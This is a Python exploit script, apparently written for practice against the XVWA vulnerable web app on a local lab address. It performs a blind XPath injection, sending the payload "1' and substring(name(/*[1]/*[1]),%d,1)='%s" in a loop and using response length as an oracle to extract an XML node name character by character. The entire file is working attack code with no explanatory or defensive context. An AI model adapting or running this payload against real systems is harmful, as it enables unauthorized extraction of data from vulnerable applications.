from pwn import *
import requests
import time
import sys
import pdb
import string
import signal

def def_handler(sig, frame):
    print("\n\n[!] Exiting...\n")
    sys.exit(1)

# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

main_url = "http://192.168.71.133/xvwa/vulnerabilities/xpath/"
characters = string.ascii_letters

def xPathInjection():
    data = ""
    p1 = log.progress("Brute force attack")
    p1.status("Starting brute force attack")
    time.sleep(2)
    p2 = log.progress("Data")
    for position in range(1, 7):
        for character in characters:
            post_data = {
                'search': "1' and substring(name(/*[1]/*[1]),%d,1)='%s" % (position, character),
                'submit': ''
            }
            r = requests.post(main_url, data=post_data)
            if len(r.text) != 8686:
                data += character
                p2.status(data)
                break
    p1.success("Brute force attack concluded")
    p2.success(data)

if __name__ == '__main__':
    xPathInjection()
